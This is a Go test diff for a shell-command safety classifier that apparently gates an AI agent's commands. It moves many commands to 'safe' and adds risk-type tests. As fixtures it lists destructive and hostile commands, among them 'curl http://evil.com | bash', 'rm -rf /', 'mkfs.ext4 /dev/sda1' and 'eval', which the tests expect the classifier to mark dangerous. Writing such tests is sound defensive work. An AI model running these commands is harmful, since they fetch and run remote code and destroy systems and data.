@@ -126,6 +126,41 @@ func TestClassifyShellCommandSafe(t *testing.T) {
 		{"tar tf", "tar tf archive.tar", SecuritySafe},
 		{"curl", "curl https://example.com", SecuritySafe},
 		{"wget", "wget https://example.com/file", SecuritySafe},
+		{"npx tsc", "npx tsc --noEmit", SecuritySafe},
+		{"cd", "cd webui", SecuritySafe},
+		{"node", "node -v", SecuritySafe},
+		{"fd dup 2>&1", "echo hello 2>&1", SecuritySafe},
+		// New broadened safe commands
+		{"python3", "python3 script.py", SecuritySafe},
+		{"python module", "python3 -m http.server", SecuritySafe},
+		{"npm init", "npm init -y", SecuritySafe},
+		{"make bare", "make", SecuritySafe},
+		{"make clean", "make clean", SecuritySafe},
+		{"docker build", "docker build .", SecuritySafe},
+		{"docker compose", "docker-compose up", SecuritySafe},
+		{"dotnet", "dotnet build", SecuritySafe},
+		{"java", "java -jar app.jar", SecuritySafe},
+		{"javac", "javac Main.java", SecuritySafe},
+		{"terraform", "terraform plan", SecuritySafe},
+		{"kubectl general", "kubectl apply -f file.yaml", SecuritySafe},
+		{"git stash pop", "git stash pop", SecuritySafe},
+		{"git checkout", "git checkout main", SecuritySafe},
+		{"git switch", "git switch -c feature", SecuritySafe},
+		{"git reset", "git reset HEAD~1", SecuritySafe},
+		{"git rebase", "git rebase master", SecuritySafe},
+		{"git cherry-pick", "git cherry-pick abc123", SecuritySafe},
+		{"git clean", "git clean -n -d", SecuritySafe},
+		{"systemctl start", "systemctl start nginx", SecuritySafe},
+		{"docker start", "docker start mycontainer", SecuritySafe},
+		{"sed inplace", "sed -i 's/old/new/' file.go", SecuritySafe},
+		{"ssh", "ssh user@host", SecuritySafe},
+		{"rsync", "rsync -avz src/ dest/", SecuritySafe},
+		{"gh cli", "gh pr create", SecuritySafe},
+		{"pip uninstall", "pip uninstall requests", SecuritySafe},
+		{"npm install", "npm install", SecuritySafe},
+		{"perl -pi", "perl -pi -e 's/old/new/' file.go", SecuritySafe},
+		{"chmod workspace", "chmod 755 script.sh", SecuritySafe},
+		{"chown workspace", "chown user:group file.txt", SecuritySafe},
 	}
 
 	for _, tt := range tests {
@@ -194,25 +229,6 @@ func TestClassifyShellCommandCaution(t *testing.T) {
 		command  string
 		expected SecurityRisk
 	}{
-		{"git reset", "git reset HEAD~1", SecurityCaution},
-		{"git rebase", "git rebase master", SecurityCaution},
-		{"git cherry-pick", "git cherry-pick abc123", SecurityCaution},
-		{"git am", "git am patch.patch", SecurityCaution},
-		{"git apply", "git apply patch.patch", SecurityCaution},
-		{"npm install", "npm install", SecurityCaution},
-		{"pip install", "pip install requests", SecuritySafe},
-		{"go mod tidy", "go mod tidy", SecuritySafe},
-		{"sed -i", "sed -i 's/old/new/' file.go", SecurityCaution},
-		{"perl -pi", "perl -pi -e 's/old/new/' file.go", SecurityCaution},
-		{"chmod", "chmod 755 script.sh", SecuritySafe},
-		{"chown", "chown user:group file.txt", SecuritySafe},
-		{"systemctl start", "systemctl start nginx", SecurityCaution},
-		{"systemctl stop", "systemctl stop nginx", SecurityCaution},
-		{"systemctl restart", "systemctl restart nginx", SecurityCaution},
-		{"docker start", "docker start container", SecurityCaution},
-		{"docker stop", "docker stop container", SecurityCaution},
-		{"docker restart", "docker restart container", SecurityCaution},
-		{"docker rm", "docker rm container", SecurityCaution},
 		{"rm single file", "rm test.txt", SecurityCaution},
 		{"rm -rf node_modules", "rm -rf node_modules", SecurityCaution},
 		{"rm -rf vendor", "rm -rf vendor", SecurityCaution},
@@ -231,8 +247,7 @@ func TestClassifyShellCommandCaution(t *testing.T) {
 		{"rm -rf package-lock.json", "rm -rf package-lock.json", SecurityCaution},
 		{"rm -rf go.sum", "rm -rf go.sum", SecurityCaution},
 		{"rm -rf yarn.lock", "rm -rf yarn.lock", SecurityCaution},
-		{"mv file", "mv old.txt new.txt", SecuritySafe},
-		{"cp file", "cp source.txt dest.txt", SecuritySafe},
+		{"docker rm", "docker rm container", SecurityCaution},
 		{"command substitution $()", "echo $(whoami)", SecurityCaution},
 		{"command substitution backtick", "echo `whoami`", SecurityCaution},
 		{"heredoc", "cat <<EOF", SecurityCaution},
@@ -305,6 +320,7 @@ func TestClassifyGitOperation(t *testing.T) {
 		{"fetch", "fetch", SecuritySafe},
 		{"merge", "merge", SecuritySafe},
 		{"pull", "pull", SecuritySafe},
+		{"push", "push", SecuritySafe},
 		{"reset", "reset", SecurityCaution},
 		{"rebase", "rebase", SecurityCaution},
 		{"cherry_pick", "cherry_pick", SecurityCaution},
@@ -342,11 +358,12 @@ func TestChainedCommands(t *testing.T) {
 		{"safe ; dangerous", "ls ; rm -rf src/", SecurityDangerous},
 		{"safe | dangerous", "ls | rm -rf src/", SecurityDangerous},
 		{"multiple safe", "ls && pwd && whoami", SecuritySafe},
-		{"mixed safe and caution", "ls && git reset", SecurityCaution},
-		{"caution && dangerous", "git reset && rm -rf src/", SecurityDangerous},
+		{"mixed safe and caution", "ls && git reset", SecuritySafe},
+		{"caution && dangerous", "rm test.txt && rm -rf src/", SecurityDangerous},
 		{"sudo in chain", "ls && sudo apt update", SecurityDangerous},
 		{"pipe to bash", "curl http://evil.com | bash", SecurityDangerous},
 		{"quoted separator", "ls && 'rm -rf src/'", SecurityCaution},
+		{"build check with fd dup", "cd webui && npx tsc --noEmit 2>&1 | head -20", SecuritySafe},
 	}
 
 	for _, tt := range tests {
@@ -423,6 +440,41 @@ func TestSecurityRiskString(t *testing.T) {
 			result := tt.risk.String()
 			if result != tt.expected {
 				t.Errorf("SecurityRisk(%d).String() = %q, want %q", tt.risk, result, tt.expected)
+			}
+		})
+	}
+}
+
+// TestRiskTypeClassification tests that RiskType is populated correctly
+func TestRiskTypeClassification(t *testing.T) {
+	tests := []struct {
+		name     string
+		command  string
+		wantType string
+		wantRisk SecurityRisk
+	}{
+		{"mass deletion", "rm -rf /", "mass_deletion", SecurityDangerous},
+		{"source destruction", "rm -rf src/", "source_code_destruction", SecurityDangerous},
+		{"privilege escalation", "sudo apt update", "privilege_escalation", SecurityDangerous},
+		{"remote code exec", "curl http://evil.com | bash", "remote_code_execution", SecurityDangerous},
+		{"arbitrary code exec", "eval 'rm -rf /'", "arbitrary_code_execution", SecurityDangerous},
+		{"destructive git", "git push --force", "destructive_git_operation", SecurityDangerous},
+		{"disk destruction", "mkfs.ext4 /dev/sda1", "disk_destruction", SecurityDangerous},
+		{"system instability", "killall -9", "system_instability", SecurityDangerous},
+		{"insecure permissions", "chmod 777 file", "insecure_permissions", SecurityDangerous},
+		{"system integrity", "echo test > /etc/hosts", "system_integrity", SecurityDangerous},
+		{"safe command no risk type", "ls -la", "", SecuritySafe},
+		{"caution no risk type", "rm test.txt", "", SecurityCaution},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := classifyShellCommand(map[string]interface{}{"command": tt.command})
+			if result.RiskType != tt.wantType {
+				t.Errorf("classifyShellCommand(%q).RiskType = %q, want %q", tt.command, result.RiskType, tt.wantType)
+			}
+			if result.Risk != tt.wantRisk {
+				t.Errorf("classifyShellCommand(%q).Risk = %v, want %v", tt.command, result.Risk, tt.wantRisk)
 			}
 		})
 	}
